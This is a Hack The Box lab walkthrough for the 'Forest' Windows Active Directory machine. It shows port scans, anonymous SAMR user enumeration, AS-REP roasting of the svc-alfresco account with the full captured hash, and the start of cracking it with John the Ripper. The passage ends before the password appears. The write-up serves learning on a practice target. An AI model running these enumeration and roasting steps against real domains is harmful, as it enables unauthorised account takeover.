# [Grav3m1ndbyte's Resources Blog](/index.html) > [Hack The Box Machine Walkthroughs](/HTB-Machines.html)


![Grav3m1ndbyte HTB Badge](https://www.hackthebox.eu/badge/image/75471)





# Forest

![Forest Infocard](/images/Forest.png)



## Overview

  This Hack The Box machine is built on Windows operating system and revolves around Active Directory and Kerberos. Great thing about this machine just like other similar ones is that it can be very close to real-life. Active Directory is used across many Enterprise environments as their credential backbone and is a service that can allow different types of attacks if it is not setup correctly. Along with this (spoiler I know), it has Microsoft Exchange in the same box; this is something that is not common in my opinion unless it is small environment like a small business and there is not enough budget for a server farm. With the move to cloud services like Office 365, using Exchange will slowly decrease (I hope) unless you are in an 'Exchange Hybrid' model.
  
  For people not well versed in Active Directory and Windows, and even if you are, there is some reading to do, or at least I recommend to do so, which is why I've added some resources below and also other links to some tools.
  
  Some great resources around this are below:
  
  
### Resources:
  
  
  1) [Active Directory Kill Chain Attack & Defense](https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md)
  
  2) [MITRE ATT&CK: Kerberoasting](https://attack.mitre.org/techniques/T1208/)
  
  3) [An Introduction to SMB for Network Security Analysts](https://401trg.com/an-introduction-to-smb-for-network-security-analysts/)
  
  4) [[MS-SAMR]: Security Account Manager (SAM) Remote Protocol (Client-to-Server)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380)
  
  5) [Configure SAM-R required permissions](https://docs.microsoft.com/en-us/advanced-threat-analytics/install-ata-step9-samr#step-9-configure-sam-r-required-permissions)
  
  6) [Mitigating Exchange Permission Paths to Domain Admins in Active Directory](https://adsecurity.org/?p=4119)



***Let's get started!***



## Information Gathering / Footprinting and Scanning

First of, we need to identify how to reach the system. In other words, we need to identify what are the services available from this machine.

Let's start by adding this machine's IP address to the hosts file and create an alias:

```
root@kali:~/Documents/HTB-Labs/Postman# echo "10.10.10.161  forest.htb" >> /etc/hosts
```

My go-to tools in this phase, which are typically used by many to start enumerating, are:

1) masscan: very nice port scanning tool that allows finding open ports quickly. To me this is a tool to narrow down the scope of the enumeration so we can focus on open ports only when using nmap.

Here, I am designating the interface to use when communitcating to the HTB machine (-e) which will be the HTB VPN interface, along with -p to designate the port range to target but I will target ALL TCP and UDP Ports, and the transmission rate of packets per second (--rate).

Similar to this, you could also run something like this: nmap -p- --min-rate=1000 -T4 

2) nmap: I think most people in the information technology and security space know what nmap does. It is a very versatile Port scanning tool which also allows you to use scripts to further target the services found. Just like anything, it can be a useful tool while it can also be damaging if the user is not careful.

What I typically start with when using nmap is:

-sC: to use all default non-intrusive nmap scripts on each service 

-sV: to get the service version information which is definitely important for us

-p: to designate the port we will be targeting 

-vvvv: for extended verbosity (as I like as many details as I can get)


### MASSCAN
```
root@kali:~# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.161 --rate=1000 > Forest_masscan.log

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-10 02:47:24 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 51127/udp on 10.10.10.161                                 
Discovered open port 464/tcp on 10.10.10.161                                   
Discovered open port 49677/tcp on 10.10.10.161                                 
Discovered open port 389/tcp on 10.10.10.161                                   
Discovered open port 47001/tcp on 10.10.10.161                                 
Discovered open port 49670/tcp on 10.10.10.161                                 
Discovered open port 49714/tcp on 10.10.10.161                                 
Discovered open port 9389/tcp on 10.10.10.161                                  
Discovered open port 5985/tcp on 10.10.10.161                                  
Discovered open port 49666/tcp on 10.10.10.161                                 
Discovered open port 135/tcp on 10.10.10.161                                   
Discovered open port 50736/udp on 10.10.10.161                                 
Discovered open port 49664/tcp on 10.10.10.161                                 
Discovered open port 3269/tcp on 10.10.10.161                                  
Discovered open port 445/tcp on 10.10.10.161                                   
Discovered open port 49684/tcp on 10.10.10.161                                 
Discovered open port 53/tcp on 10.10.10.161                                    
Discovered open port 49695/tcp on 10.10.10.161                                 
Discovered open port 593/tcp on 10.10.10.161                                   
Discovered open port 52551/udp on 10.10.10.161                                 
Discovered open port 636/tcp on 10.10.10.161                                   
Discovered open port 49667/tcp on 10.10.10.161                                 
Discovered open port 3268/tcp on 10.10.10.161                                  
Discovered open port 88/tcp on 10.10.10.161                                    
Discovered open port 50604/udp on 10.10.10.161                                 
Discovered open port 139/tcp on 10.10.10.161
```

As you can see, we found some UDP High Ports that at the moment we do not see a use for them. Below is an example of how you can filter these out and create a usable list that can make our lives easier. If you notice the output versus the list of ports I used in nmap, they are not in the same order as the below is for your benefit.

```
root@kali:~/Documents/HTB-Labs/Forest# cat Forest_masscan.log | grep Discovered | cut -d" " -f4 | cut -d"/" -f1 | sort | xargs | tr " " ","
135,139,3268,3269,389,445,464,47001,49664,49666,49667,49670,49677,49684,49695,49714,50604,50736,51127,52551,53,593,5985,636,88,9389
```


### NMAP
```
root@kali:~/Documents/HTB-Labs/Forest# nmap -sC -sV -vvv -p 445,49667,47001,88,49665,636,139,464,3268,49670,49697,53,135,49669,5985,389,49671,9389,3269,49897,49678,49666,49664,593 -oX Forest_TCP.xml -oN Forest_TCP.log forest.htb
# Nmap 7.80 scan initiated Sun Oct 20 21:57:16 2019 as: nmap -sC -sV -vvv -p 445,49667,47001,88,49665,636,139,464,3268,49670,49697,53,135,49669,5985,389,49671,9389,3269,49897,49678,49666,49664,593 -oX Forest_TCP.xml -oN Forest_TCP.log 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2019-10-20 21:57:17 EDT for 317s

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain?      syn-ack ttl 127
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2019-10-21 02:04:14Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49897/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/20%Time=5DAD1089%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```
As you can see from the open ports found, we have the following which are very important:

-> Kerberos: 88/tcp    Microsoft Windows Kerberos

-> LDAP: 389/tcp   Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)

-> SMB: 445/tcp   Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)

-> LDAPS: 636/tcp 

-> Windows Remote Management (WinRM): 5985/tcp  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


Along with these, given that RPC and Dynamic RPC (on the TCP High Ports) are available, means to us that SAMR is also available. Why is this important? Well, SAMR or RPC over SMB, or Security Account Manager Remote Protocol, could potentially allow account enumeration with no authentication. That's a big deal, especially when Microsoft recommends to have this locked down (see Resource #5).

With that being said, let's move forward with Impacket's SAMRDump script to get user account information. This step will give you a lot of good information.


### SAMRDUMP
```
root@kali:~/Documents/HTB-Labs/Forest# impacket-samrdump -target-ip forest.htb -port 445 -no-pass htb.local
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Retrieving endpoint list from htb.local
Found domain(s):
 . HTB
 . Builtin
[*] Looking up users in domain HTB
Found user: Administrator, uid = 500
Found user: Guest, uid = 501
Found user: krbtgt, uid = 502
Found user: DefaultAccount, uid = 503
Found user: $331000-VK4ADACQNUCA, uid = 1123
Found user: SM_2c8eef0a09b545acb, uid = 1124
Found user: SM_ca8c2ed5bdab4dc9b, uid = 1125
Found user: SM_75a538d3025e4db9a, uid = 1126
Found user: SM_681f53d4942840e18, uid = 1127
Found user: SM_1b41c9286325456bb, uid = 1128
Found user: SM_9b69f1b9d2cc45549, uid = 1129
Found user: SM_7c96b981967141ebb, uid = 1130
Found user: SM_c75ee099d0a64c91b, uid = 1131
Found user: SM_1ffab36a2f5f479cb, uid = 1132
Found user: HealthMailboxc3d7722, uid = 1134
Found user: HealthMailboxfc9daad, uid = 1135
Found user: HealthMailboxc0a90c9, uid = 1136
Found user: HealthMailbox670628e, uid = 1137
Found user: HealthMailbox968e74d, uid = 1138
Found user: HealthMailbox6ded678, uid = 1139
Found user: HealthMailbox83d6781, uid = 1140
Found user: HealthMailboxfd87238, uid = 1141
Found user: HealthMailboxb01ac64, uid = 1142
Found user: HealthMailbox7108a4e, uid = 1143
Found user: HealthMailbox0659cc1, uid = 1144
Found user: sebastien, uid = 1145
Found user: lucinda, uid = 1146
Found user: svc-alfresco, uid = 1147
Found user: andy, uid = 1150
Found user: mark, uid = 1151
Found user: santi, uid = 1152
Administrator (500)/FullName: Administrator
Administrator (500)/UserComment: 
Administrator (500)/PrimaryGroupId: 513
Administrator (500)/BadPasswordCount: 0
Administrator (500)/LogonCount: 49
Administrator (500)/PasswordLastSet: 2019-09-18 13:09:08.342879
Administrator (500)/PasswordDoesNotExpire: False
Administrator (500)/AccountIsDisabled: False
Administrator (500)/ScriptPath: 
Guest (501)/FullName: 
Guest (501)/UserComment: 
Guest (501)/PrimaryGroupId: 514
Guest (501)/BadPasswordCount: 0
Guest (501)/LogonCount: 0
Guest (501)/PasswordLastSet: <never>
Guest (501)/PasswordDoesNotExpire: True
Guest (501)/AccountIsDisabled: True
Guest (501)/ScriptPath: 
krbtgt (502)/FullName: 
krbtgt (502)/UserComment: 
krbtgt (502)/PrimaryGroupId: 513
krbtgt (502)/BadPasswordCount: 0
krbtgt (502)/LogonCount: 0
krbtgt (502)/PasswordLastSet: 2019-09-18 06:53:23.467452
krbtgt (502)/PasswordDoesNotExpire: False
krbtgt (502)/AccountIsDisabled: True
krbtgt (502)/ScriptPath: 
DefaultAccount (503)/FullName: 
DefaultAccount (503)/UserComment: 
DefaultAccount (503)/PrimaryGroupId: 513
DefaultAccount (503)/BadPasswordCount: 0
DefaultAccount (503)/LogonCount: 0
DefaultAccount (503)/PasswordLastSet: <never>
DefaultAccount (503)/PasswordDoesNotExpire: True
DefaultAccount (503)/AccountIsDisabled: True
DefaultAccount (503)/ScriptPath: 
$331000-VK4ADACQNUCA (1123)/FullName: 
$331000-VK4ADACQNUCA (1123)/UserComment: 
$331000-VK4ADACQNUCA (1123)/PrimaryGroupId: 513
$331000-VK4ADACQNUCA (1123)/BadPasswordCount: 0
$331000-VK4ADACQNUCA (1123)/LogonCount: 0
$331000-VK4ADACQNUCA (1123)/PasswordLastSet: <never>
$331000-VK4ADACQNUCA (1123)/PasswordDoesNotExpire: False
$331000-VK4ADACQNUCA (1123)/AccountIsDisabled: True
$331000-VK4ADACQNUCA (1123)/ScriptPath: 
SM_2c8eef0a09b545acb (1124)/FullName: Microsoft Exchange Approval Assistant
SM_2c8eef0a09b545acb (1124)/UserComment: 
SM_2c8eef0a09b545acb (1124)/PrimaryGroupId: 513
SM_2c8eef0a09b545acb (1124)/BadPasswordCount: 0
SM_2c8eef0a09b545acb (1124)/LogonCount: 0
SM_2c8eef0a09b545acb (1124)/PasswordLastSet: <never>
SM_2c8eef0a09b545acb (1124)/PasswordDoesNotExpire: False
SM_2c8eef0a09b545acb (1124)/AccountIsDisabled: True
SM_2c8eef0a09b545acb (1124)/ScriptPath: 
SM_ca8c2ed5bdab4dc9b (1125)/FullName: Microsoft Exchange
SM_ca8c2ed5bdab4dc9b (1125)/UserComment: 
SM_ca8c2ed5bdab4dc9b (1125)/PrimaryGroupId: 513
SM_ca8c2ed5bdab4dc9b (1125)/BadPasswordCount: 0
SM_ca8c2ed5bdab4dc9b (1125)/LogonCount: 0
SM_ca8c2ed5bdab4dc9b (1125)/PasswordLastSet: <never>
SM_ca8c2ed5bdab4dc9b (1125)/PasswordDoesNotExpire: False
SM_ca8c2ed5bdab4dc9b (1125)/AccountIsDisabled: True
SM_ca8c2ed5bdab4dc9b (1125)/ScriptPath: 
SM_75a538d3025e4db9a (1126)/FullName: Microsoft Exchange
SM_75a538d3025e4db9a (1126)/UserComment: 
SM_75a538d3025e4db9a (1126)/PrimaryGroupId: 513
SM_75a538d3025e4db9a (1126)/BadPasswordCount: 0
SM_75a538d3025e4db9a (1126)/LogonCount: 0
SM_75a538d3025e4db9a (1126)/PasswordLastSet: <never>
SM_75a538d3025e4db9a (1126)/PasswordDoesNotExpire: False
SM_75a538d3025e4db9a (1126)/AccountIsDisabled: True
SM_75a538d3025e4db9a (1126)/ScriptPath: 
SM_681f53d4942840e18 (1127)/FullName: Discovery Search Mailbox
SM_681f53d4942840e18 (1127)/UserComment: 
SM_681f53d4942840e18 (1127)/PrimaryGroupId: 513
SM_681f53d4942840e18 (1127)/BadPasswordCount: 0
SM_681f53d4942840e18 (1127)/LogonCount: 0
SM_681f53d4942840e18 (1127)/PasswordLastSet: <never>
SM_681f53d4942840e18 (1127)/PasswordDoesNotExpire: False
SM_681f53d4942840e18 (1127)/AccountIsDisabled: True
SM_681f53d4942840e18 (1127)/ScriptPath: 
SM_1b41c9286325456bb (1128)/FullName: Microsoft Exchange Migration
SM_1b41c9286325456bb (1128)/UserComment: 
SM_1b41c9286325456bb (1128)/PrimaryGroupId: 513
SM_1b41c9286325456bb (1128)/BadPasswordCount: 0
SM_1b41c9286325456bb (1128)/LogonCount: 0
SM_1b41c9286325456bb (1128)/PasswordLastSet: <never>
SM_1b41c9286325456bb (1128)/PasswordDoesNotExpire: False
SM_1b41c9286325456bb (1128)/AccountIsDisabled: True
SM_1b41c9286325456bb (1128)/ScriptPath: 
SM_9b69f1b9d2cc45549 (1129)/FullName: Microsoft Exchange Federation Mailbox
SM_9b69f1b9d2cc45549 (1129)/UserComment: 
SM_9b69f1b9d2cc45549 (1129)/PrimaryGroupId: 513
SM_9b69f1b9d2cc45549 (1129)/BadPasswordCount: 0
SM_9b69f1b9d2cc45549 (1129)/LogonCount: 0
SM_9b69f1b9d2cc45549 (1129)/PasswordLastSet: <never>
SM_9b69f1b9d2cc45549 (1129)/PasswordDoesNotExpire: False
SM_9b69f1b9d2cc45549 (1129)/AccountIsDisabled: True
SM_9b69f1b9d2cc45549 (1129)/ScriptPath: 
SM_7c96b981967141ebb (1130)/FullName: E4E Encryption Store - Active
SM_7c96b981967141ebb (1130)/UserComment: 
SM_7c96b981967141ebb (1130)/PrimaryGroupId: 513
SM_7c96b981967141ebb (1130)/BadPasswordCount: 0
SM_7c96b981967141ebb (1130)/LogonCount: 0
SM_7c96b981967141ebb (1130)/PasswordLastSet: <never>
SM_7c96b981967141ebb (1130)/PasswordDoesNotExpire: False
SM_7c96b981967141ebb (1130)/AccountIsDisabled: True
SM_7c96b981967141ebb (1130)/ScriptPath: 
SM_c75ee099d0a64c91b (1131)/FullName: Microsoft Exchange
SM_c75ee099d0a64c91b (1131)/UserComment: 
SM_c75ee099d0a64c91b (1131)/PrimaryGroupId: 513
SM_c75ee099d0a64c91b (1131)/BadPasswordCount: 0
SM_c75ee099d0a64c91b (1131)/LogonCount: 0
SM_c75ee099d0a64c91b (1131)/PasswordLastSet: <never>
SM_c75ee099d0a64c91b (1131)/PasswordDoesNotExpire: False
SM_c75ee099d0a64c91b (1131)/AccountIsDisabled: True
SM_c75ee099d0a64c91b (1131)/ScriptPath: 
SM_1ffab36a2f5f479cb (1132)/FullName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
SM_1ffab36a2f5f479cb (1132)/UserComment: 
SM_1ffab36a2f5f479cb (1132)/PrimaryGroupId: 513
SM_1ffab36a2f5f479cb (1132)/BadPasswordCount: 0
SM_1ffab36a2f5f479cb (1132)/LogonCount: 0
SM_1ffab36a2f5f479cb (1132)/PasswordLastSet: <never>
SM_1ffab36a2f5f479cb (1132)/PasswordDoesNotExpire: False
SM_1ffab36a2f5f479cb (1132)/AccountIsDisabled: True
SM_1ffab36a2f5f479cb (1132)/ScriptPath: 
HealthMailboxc3d7722 (1134)/FullName: HealthMailbox-EXCH01-Mailbox-Database-1118319013
HealthMailboxc3d7722 (1134)/UserComment: 
HealthMailboxc3d7722 (1134)/PrimaryGroupId: 513
HealthMailboxc3d7722 (1134)/BadPasswordCount: 0
HealthMailboxc3d7722 (1134)/LogonCount: 1470
HealthMailboxc3d7722 (1134)/PasswordLastSet: 2019-09-23 18:51:31.892097
HealthMailboxc3d7722 (1134)/PasswordDoesNotExpire: True
HealthMailboxc3d7722 (1134)/AccountIsDisabled: False
HealthMailboxc3d7722 (1134)/ScriptPath: 
HealthMailboxfc9daad (1135)/FullName: HealthMailbox-EXCH01-001
HealthMailboxfc9daad (1135)/UserComment: 
HealthMailboxfc9daad (1135)/PrimaryGroupId: 513
HealthMailboxfc9daad (1135)/BadPasswordCount: 0
HealthMailboxfc9daad (1135)/LogonCount: 59
HealthMailboxfc9daad (1135)/PasswordLastSet: 2019-09-23 18:51:35.267114
HealthMailboxfc9daad (1135)/PasswordDoesNotExpire: True
HealthMailboxfc9daad (1135)/AccountIsDisabled: False
HealthMailboxfc9daad (1135)/ScriptPath: 
HealthMailboxc0a90c9 (1136)/FullName: HealthMailbox-EXCH01-002
HealthMailboxc0a90c9 (1136)/UserComment: 
HealthMailboxc0a90c9 (1136)/PrimaryGroupId: 513
HealthMailboxc0a90c9 (1136)/BadPasswordCount: 0
HealthMailboxc0a90c9 (1136)/LogonCount: 0
HealthMailboxc0a90c9 (1136)/PasswordLastSet: 2019-09-19 07:56:35.206329
HealthMailboxc0a90c9 (1136)/PasswordDoesNotExpire: True
HealthMailboxc0a90c9 (1136)/AccountIsDisabled: False
HealthMailboxc0a90c9 (1136)/ScriptPath: 
HealthMailbox670628e (1137)/FullName: HealthMailbox-EXCH01-003
HealthMailbox670628e (1137)/UserComment: 
HealthMailbox670628e (1137)/PrimaryGroupId: 513
HealthMailbox670628e (1137)/BadPasswordCount: 0
HealthMailbox670628e (1137)/LogonCount: 0
HealthMailbox670628e (1137)/PasswordLastSet: 2019-09-19 07:56:45.643993
HealthMailbox670628e (1137)/PasswordDoesNotExpire: True
HealthMailbox670628e (1137)/AccountIsDisabled: False
HealthMailbox670628e (1137)/ScriptPath: 
HealthMailbox968e74d (1138)/FullName: HealthMailbox-EXCH01-004
HealthMailbox968e74d (1138)/UserComment: 
HealthMailbox968e74d (1138)/PrimaryGroupId: 513
HealthMailbox968e74d (1138)/BadPasswordCount: 0
HealthMailbox968e74d (1138)/LogonCount: 0
HealthMailbox968e74d (1138)/PasswordLastSet: 2019-09-19 07:56:56.143969
HealthMailbox968e74d (1138)/PasswordDoesNotExpire: True
HealthMailbox968e74d (1138)/AccountIsDisabled: False
HealthMailbox968e74d (1138)/ScriptPath: 
HealthMailbox6ded678 (1139)/FullName: HealthMailbox-EXCH01-005
HealthMailbox6ded678 (1139)/UserComment: 
HealthMailbox6ded678 (1139)/PrimaryGroupId: 513
HealthMailbox6ded678 (1139)/BadPasswordCount: 0
HealthMailbox6ded678 (1139)/LogonCount: 0
HealthMailbox6ded678 (1139)/PasswordLastSet: 2019-09-19 07:57:06.597012
HealthMailbox6ded678 (1139)/PasswordDoesNotExpire: True
HealthMailbox6ded678 (1139)/AccountIsDisabled: False
HealthMailbox6ded678 (1139)/ScriptPath: 
HealthMailbox83d6781 (1140)/FullName: HealthMailbox-EXCH01-006
HealthMailbox83d6781 (1140)/UserComment: 
HealthMailbox83d6781 (1140)/PrimaryGroupId: 513
HealthMailbox83d6781 (1140)/BadPasswordCount: 0
HealthMailbox83d6781 (1140)/LogonCount: 0
HealthMailbox83d6781 (1140)/PasswordLastSet: 2019-09-19 07:57:17.065809
HealthMailbox83d6781 (1140)/PasswordDoesNotExpire: True
HealthMailbox83d6781 (1140)/AccountIsDisabled: False
HealthMailbox83d6781 (1140)/ScriptPath: 
HealthMailboxfd87238 (1141)/FullName: HealthMailbox-EXCH01-007
HealthMailboxfd87238 (1141)/UserComment: 
HealthMailboxfd87238 (1141)/PrimaryGroupId: 513
HealthMailboxfd87238 (1141)/BadPasswordCount: 0
HealthMailboxfd87238 (1141)/LogonCount: 0
HealthMailboxfd87238 (1141)/PasswordLastSet: 2019-09-19 07:57:27.487679
HealthMailboxfd87238 (1141)/PasswordDoesNotExpire: True
HealthMailboxfd87238 (1141)/AccountIsDisabled: False
HealthMailboxfd87238 (1141)/ScriptPath: 
HealthMailboxb01ac64 (1142)/FullName: HealthMailbox-EXCH01-008
HealthMailboxb01ac64 (1142)/UserComment: 
HealthMailboxb01ac64 (1142)/PrimaryGroupId: 513
HealthMailboxb01ac64 (1142)/BadPasswordCount: 0
HealthMailboxb01ac64 (1142)/LogonCount: 0
HealthMailboxb01ac64 (1142)/PasswordLastSet: 2019-09-19 07:57:37.878559
HealthMailboxb01ac64 (1142)/PasswordDoesNotExpire: True
HealthMailboxb01ac64 (1142)/AccountIsDisabled: False
HealthMailboxb01ac64 (1142)/ScriptPath: 
HealthMailbox7108a4e (1143)/FullName: HealthMailbox-EXCH01-009
HealthMailbox7108a4e (1143)/UserComment: 
HealthMailbox7108a4e (1143)/PrimaryGroupId: 513
HealthMailbox7108a4e (1143)/BadPasswordCount: 0
HealthMailbox7108a4e (1143)/LogonCount: 0
HealthMailbox7108a4e (1143)/PasswordLastSet: 2019-09-19 07:57:48.253341
HealthMailbox7108a4e (1143)/PasswordDoesNotExpire: True
HealthMailbox7108a4e (1143)/AccountIsDisabled: False
HealthMailbox7108a4e (1143)/ScriptPath: 
HealthMailbox0659cc1 (1144)/FullName: HealthMailbox-EXCH01-010
HealthMailbox0659cc1 (1144)/UserComment: 
HealthMailbox0659cc1 (1144)/PrimaryGroupId: 513
HealthMailbox0659cc1 (1144)/BadPasswordCount: 0
HealthMailbox0659cc1 (1144)/LogonCount: 0
HealthMailbox0659cc1 (1144)/PasswordLastSet: 2019-09-19 07:57:58.643994
HealthMailbox0659cc1 (1144)/PasswordDoesNotExpire: True
HealthMailbox0659cc1 (1144)/AccountIsDisabled: False
HealthMailbox0659cc1 (1144)/ScriptPath: 
sebastien (1145)/FullName: Sebastien Caron
sebastien (1145)/UserComment: 
sebastien (1145)/PrimaryGroupId: 513
sebastien (1145)/BadPasswordCount: 0
sebastien (1145)/LogonCount: 8
sebastien (1145)/PasswordLastSet: 2019-09-19 20:29:59.544725
sebastien (1145)/PasswordDoesNotExpire: True
sebastien (1145)/AccountIsDisabled: False
sebastien (1145)/ScriptPath: 
lucinda (1146)/FullName: Lucinda Berger
lucinda (1146)/UserComment: 
lucinda (1146)/PrimaryGroupId: 513
lucinda (1146)/BadPasswordCount: 0
lucinda (1146)/LogonCount: 0
lucinda (1146)/PasswordLastSet: 2019-09-19 20:44:13.233891
lucinda (1146)/PasswordDoesNotExpire: True
lucinda (1146)/AccountIsDisabled: False
lucinda (1146)/ScriptPath: 
svc-alfresco (1147)/FullName: svc-alfresco
svc-alfresco (1147)/UserComment: 
svc-alfresco (1147)/PrimaryGroupId: 513
svc-alfresco (1147)/BadPasswordCount: 0
svc-alfresco (1147)/LogonCount: 6
svc-alfresco (1147)/PasswordLastSet: 2020-01-09 22:44:28.992331
svc-alfresco (1147)/PasswordDoesNotExpire: True
svc-alfresco (1147)/AccountIsDisabled: False
svc-alfresco (1147)/ScriptPath: 
andy (1150)/FullName: Andy Hislip
andy (1150)/UserComment: 
andy (1150)/PrimaryGroupId: 513
andy (1150)/BadPasswordCount: 0
andy (1150)/LogonCount: 0
andy (1150)/PasswordLastSet: 2019-09-22 18:44:16.291082
andy (1150)/PasswordDoesNotExpire: True
andy (1150)/AccountIsDisabled: False
andy (1150)/ScriptPath: 
mark (1151)/FullName: Mark Brandt
mark (1151)/UserComment: 
mark (1151)/PrimaryGroupId: 513
mark (1151)/BadPasswordCount: 0
mark (1151)/LogonCount: 0
mark (1151)/PasswordLastSet: 2019-09-20 18:57:30.243568
mark (1151)/PasswordDoesNotExpire: True
mark (1151)/AccountIsDisabled: False
mark (1151)/ScriptPath: 
santi (1152)/FullName: Santi Rodriguez
santi (1152)/UserComment: 
santi (1152)/PrimaryGroupId: 513
santi (1152)/BadPasswordCount: 0
santi (1152)/LogonCount: 0
santi (1152)/PasswordLastSet: 2019-09-20 19:02:55.134828
santi (1152)/PasswordDoesNotExpire: True
santi (1152)/AccountIsDisabled: False
santi (1152)/ScriptPath: 
[*] Received 31 entries.
```

As mentioned, enumerating through SAMR gave us visibility over all users including mailbox accounts. From this we can also build a user list easily:
```
root@kali:~/Documents/HTB-Labs/Forest# cat Forest_impacted-samr.txt | grep "Found user*" | cut -d":" -f2 | cut -d"," -f1 | tr -d " " > Forest_users.txt

root@kali:~/Documents/HTB-Labs/Forest# cat Forest_users.txt
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
chris
```



## Exploitation and Gaining Access

Since Kerberos is available and we saw krbtgt user, let's check if all accounts have Kerberos Pre-Authentication enabled. By default, Kerberos Pre-Authentication is enabled, and has to be manually disabled per account (to my understanding). A great explanation was done by one of the Hack The Box members (kudos to VbScrub) and is worth watching, [GetNPUsers & Kerberos Pre-Auth Explained](https://www.youtube.com/watch?v=pZSyGRjHNO4&feature=youtu.be). Using GetNPUsers.py will help us test this and if one is found, it will let us retrieve their TGT to then crack it. ***Kerberoasting***


### GETNPUSERS
```
root@kali:~/Documents/HTB-Labs/Forest# /opt/impacket/examples/GetNPUsers.py -request -dc-ip forest.htb htb.local/
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-01-09 22:58:26.322079  2019-09-23 07:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:d9644faaaaef08d897e27b1127542f8e$8bdfa55873701bfda60228e02bedfb6e5c54c7eafcd7ad8e51363be34369238db71975d4ac5635aead39b406d8a57cd2e6dafe9f8e9925d7e3dcb03bc8c978df96afa8818e0e811a525fedcbd9f0207c1f146c36130959e6984f67b7559724fb236ac6aef8fc53a74ee553f6960b096207ee28765eeba436340f6f205c7fb7f3e56880ce104ae6908d1131d6193c99a43e46b4c9fa39357d95cea9cefbc94f5fc01b54247761a10ec947ae3fe79a38c075f776000b095cdc797c65784e08f66acf98538ca0bdd292165936d8c1b285fb71ecf826544e7f58b380d0d1acf364d32fb73c07222c
```

We just found the user **htb.local\svc-alfresco** (a service account) and its TGT; let's try to crack it


### JOHN THE RIPPER
```
root@kali:~/Documents/HTB-Labs/Forest# john --wordlist=/usr/share/wordlists/rockyou.txt Forest_TGT_svc-alfresco.txt > Forest_svc-alfrescoCreds.txt
Using default input encoding: UTF-8
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1g 0:00:00:05 DONE (2020-01-09 23:02) 0.1692g/s 691329p/s 691329c/s 691329C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~/Documents/HTB-Labs/Forest# cat Forest_svc-alfrescoCreds.txt
